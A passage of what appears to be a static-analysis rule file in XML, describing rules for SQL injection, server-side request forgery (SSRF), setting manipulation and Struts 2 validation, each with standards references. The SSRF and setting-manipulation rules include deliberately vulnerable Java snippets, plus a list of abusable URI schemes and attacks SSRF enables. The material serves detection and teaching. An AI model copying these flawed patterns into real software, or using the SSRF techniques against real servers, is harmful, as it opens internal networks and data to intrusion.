solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] iBatis <em>Data Mapper Developer Guide</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[23] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[24] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[25] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[26] iBatis <em>Working with Data Maps</em> <br></p>
																									   <p>[27] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_server_side_request_forgery
		</key>
		<internalKey>Input Validation and Representation/Server-Side Request
			Forgery
		</internalKey>
		<name>Server-Side Request Forgery</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application initiates a network connection to a third-party system using user-controlled data to craft the resource URI.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Server-Side Request Forgery occurs when an attacker can influence a network connection made by the application server. The network connection will originate from the application server internal IP and an attacker will be able to use this connection to bypass network controls and scan or attack internal resources that are not otherwise exposed.<br><br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example:</b> In the following example, an attacker will be able to control the URL the server is connecting to.<br><br><pre><br>String url = request.getParameter("url");<br>CloseableHttpClient httpclient = HttpClients.createDefault();<br>HttpGet httpGet = new HttpGet(url);<br>CloseableHttpResponse response1 = httpclient.execute(httpGet);<br></pre><br><br>The ability of the attacker to hijack the network connection will depend on the specific part of the URI that he can control and on libraries used to stablish the connection. For example, controlling the URI scheme will let the attacker use protocols different from <code>http</code> or <code>https</code> like:<br><br>- up://<br>- ldap://<br>- jar://<br>- gopher://<br>- mailto://<br>- ssh2://<br>- telnet://<br>- expect://<br><br>An attacker will be able to leverage this hijacked network connection to perform the following attacks:<br><br>- Port Scanning of intranet resources.<br>- Bypass firewalls.<br>- Attack vulnerable programs running on the application server or on the Intranet.<br>- Attack internal/external web applications using Injection attacks or CSRF.<br>- Access local files using file:// scheme.<br>- On Windows systems, file:// scheme and UNC paths can allow an attacker to scan and access internal shares.<br>- Perform a DNS cache poisoning attack.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 918</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[18]  <em>SSRF bible. Cheatsheet</em> ONSec Labs<br></p>
																									   <p>[19] Alexander Polyakov <em>SSRF vs. Business critical applications</em> BlackHat 2012<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_setting_manipulation</key>
		<internalKey>Input Validation and Representation/Setting Manipulation
		</internalKey>
		<name>Setting Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing external control of system settings can disrupt service or cause an application to behave in unexpected ways.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Setting manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application.<br><br><br><br>Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.<br><br><b>Example 1:</b> The following Java code snippet reads a string from an <code>HttpServletRequest</code> and sets it as the active catalog for a database <code>Connection</code>.<br><br><pre><br>...<br>conn.setCatalog(request.getParamter("catalog"));<br>...<br></pre><br><br>In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database.<br><br>In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of your attacker.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 15</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_2_action_field_without_validator
		</key>
		<internalKey>Input Validation and Representation/Struts 2/Action Field
			Without Validator
		</internalKey>
		<name>Struts 2: Action Field Without Validator</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An Action Field was found without a corresponding validation definition.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  One or more Action Fields do not have a corresponding validation definition. Each field should have an explicit validation routine referenced in ActionClass-validation.xml.<br><br>	    	    It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the lack of a validator definition.<br><br>It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 101</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[16] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[17]  <em>The Struts2 Validation Framework</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_2_duplicate_action_field_validators
		</key>
		<internalKey>Input Validation and Representation/Struts 2/Duplicate
			Action Field Validators
		</internalKey>
		<name>Struts 2: Duplicate Action Field Validators</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Multiple Struts2 field validator references with the same name exist. Duplicate validator references are an indication that validation is not up to date.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  More than one field validator definition with the same name exist in <code>ActionClass-validation.xml</code>. Duplicate validation definitions with the same name may result in unexpected behavior.<br><br>	    <b>Example:</b> The following entry shows two duplicate field validator definitions.<br><br>    <pre><br>   &lt;field name="emailField"&gt;<br>      &lt;field-validator type="email" short-circuit="true"&gt;<br>          &lt;message&gt;You must enter a value for email.&lt;/message&gt;<br>      &lt;/field-validator&gt;<br>      &lt;field-validator type="email" short-circuit="true"&gt;<br>          &lt;message&gt;Not a valid e-mail.&lt;/message&gt;<br>      &lt;/field-validator&gt;<br>  &lt;/field&gt;<br>  </pre><br><br>It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 101</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[15]  <em>The Struts2 Validation Framework</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_2_duplicate_validation_files
		</key>
		<internalKey>Input Validation and Representation/Struts 2/Duplicate
			Validation Files
		</internalKey>
		<name>Struts 2: Duplicate Validation Files</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Multiple Struts2 Validation files exist for this Action. Multiple validation forms are an indication that validation is not up to date.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  More than one ActionClass-validation.xml file was discovered for this Struts2 Action definition. For each Struts2 Action defined in the form of ActionClass, Struts2 searches for a corresponding ActionClass-validation.xml for the necessary validation constraints. Having multiple validation definitions for one Action included in the deployment may result in unexpected behavior.<br><br>	    If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations. Moreover, it indicates that the validation logic is not being maintained, and can indicate that other, more subtle, validation errors are present.<br><br>It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 101</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[15]  <em>The Struts2 Validation Framework</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_2_duplicate_validators
		</key>
		<internalKey>Input Validation and Representation/Struts 2/Duplicate
			Validators
		</internalKey>
		<name>Struts 2: Duplicate Validators</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Multiple Struts2 validator references with the same name exist. Duplicate validator references are an indication that validation is not up to date.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  More than one validator definition was discovered in <code>validators.xml</code>. Multiple validation definitions with the same name may result in unexpected behavior.<br><br>	    If two validation classes are defined with the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations. Moreover, it indicates that the validation logic is not being maintained, and can indicate that other, more subtle, validation errors are present.<br><br>It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 101</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[15]  <em>The Struts2 Validation Framework</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_2_undeclared_validator
		</key>
		<internalKey>Input Validation and Representation/Struts 2/Undeclared
			Validator
		</internalKey>
		<name>Struts 2: Undeclared Validator</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A validator referenced in ActionClass-validation.xml is not declared in validators.xml
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Struts2 requires that custom validators be defined in <code>validators.xml</code> before being used in a Action validator definition. Missing validator definitions are an indication that validation is not up to date.<br><br><b>Example:</b> The following Action validator was not defined in <code>validators.xml</code>.<br><pre><br>&lt;validators&gt;<br>    &lt;validator name="required" class="com.opensymphony.xwork2.validator.validators.RequiredFieldValidator"/&gt;<br>&lt;/validators&gt;<br></pre><br><br>It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 101</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[16] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[17]  <em>The Struts2 Validation Framework</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_2_unvalidated_action
		</key>
		<internalKey>Input Validation and Representation/Struts 2/Unvalidated
			Action
		</internalKey>
		<name>Struts 2: Unvalidated Action</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Struts2 Actions should utilize the Struts Validation framework to prevent vulnerabilities that result from unchecked input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Unchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.<br><br>To prevent such attacks, use the Struts Validation framework to check all program input before it is processed by the application. Use HP Fortify Static Code Analyzer to ensure that there are no holes in your configuration of the Struts Validator.<br><br>Example uses of the validator include checking to ensure that:<br><br>- Phone number fields contain only valid characters in phone numbers<br><br>- Boolean values are only "T" or "F"<br><br>- Free-form strings are of a reasonable length and composition
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
